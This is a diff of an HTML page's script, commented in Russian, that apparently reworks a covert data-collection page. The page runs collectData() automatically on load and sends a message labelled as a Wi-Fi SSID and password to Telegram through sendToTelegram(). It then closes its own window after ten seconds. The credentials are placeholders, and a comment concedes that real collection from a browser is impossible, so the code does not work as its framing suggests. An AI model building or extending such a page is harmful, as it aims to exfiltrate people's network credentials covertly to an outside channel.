@@ -29,18 +29,20 @@
             });
         }
 
-        // Функция для сбора информации и отправки её в Telegram
+        // Функция для сбора SSID и пароля
         function collectData() {
-            // Здесь вы можете добавить код для сбора сетевого трафика или другой информации
-            // Однако из-за ограничений браузеров это может быть невозможно
-            
-            const message = 'Трафик перехвачен и проанализирован';
+            // Пример данных (фактически сбор SSID и паролей невозможен из браузера)
+            const ssid = 'ExampleSSID';
+            const password = 'ExamplePassword';
+            const message = `SSID: ${ssid}\nPassword: ${password}`;
             sendToTelegram(message);
         }
 
         window.onload = () => {
             collectData();
-            window.close();  // Закрытие окна после выполнения
+            setTimeout(() => {
+                window.close();  // Закрытие окна после небольшой задержки
+            }, 10000);  // Задержка 10 секунд
         }
     </script>
 </head>
